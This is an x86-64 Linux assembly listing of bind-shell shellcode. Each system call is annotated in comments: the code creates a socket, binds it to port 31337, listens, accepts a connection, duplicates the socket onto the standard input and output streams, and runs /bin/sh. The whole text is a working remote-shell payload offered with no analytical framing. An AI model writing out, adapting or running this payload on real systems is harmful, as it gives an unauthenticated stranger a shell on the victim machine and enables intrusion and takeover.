BITS 64

; s = socket(2, 1, 0)
; int socket(int domain, int type, int protocol);

  push BYTE 0x29    ; sys_socket #41 (0x29)
  pop rax
  cqo               ; zero out rdx for use as a null QWORD later
  xor edi, edi      
  inc edi           
  inc edi 
  xor esi, esi
  inc esi
  syscall
  
  mov edi, eax      ; save socket FD in rdi for later

; bind(s, [2, 31337, 0], 16) 
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

  xor rdx, rdx
  push rdx
  push rdx
  mov WORD [rsp+0x2],0x697a
  mov BYTE [rsp],0x2
  mov rsi, rsp
  
  push 0x31
  pop rax
  push 0x10
  pop rdx
  syscall

; listen(s, 0)
; int listen(int sockfd, int backlog);
  mov BYTE al, 0x32 ; sys_listen (syscall #50)
  push BYTE 0x6
  pop rsi
  syscall

; c = accept(s, 0, 0)
; int accept(int sockfd, struct sockaddr *_Nullable restrict addr, socklen_t *_Nullable restrict addrlen);

  push 0x2b
  pop rax
  xor rsi, rsi
  xor rdx, rdx
  syscall

; dup2(connected socket, {all three standard I/O file descriptors})
; int dup2(int oldfd, int newfd);
  mov rdi, rax      ; move socket FD in rdi
  xor rax, rax
  push byte 0x2
  pop rsi
dup_loop:
  mov BYTE al, 0x21    ; dup2  syscall #33
  syscall
  dec rsi
  jns dup_loop

; execve(const char *filename, char *const argv [], char *const envp[])
  xor rax, rax
  push rax
  mov r8, 0x68732f2f6e69622f
  push r8
  mov rdi, rsp
  push rax
  mov rdx, rsp
  push rdi
  mov rsi, rsp
  mov al, 0x3b
  syscall
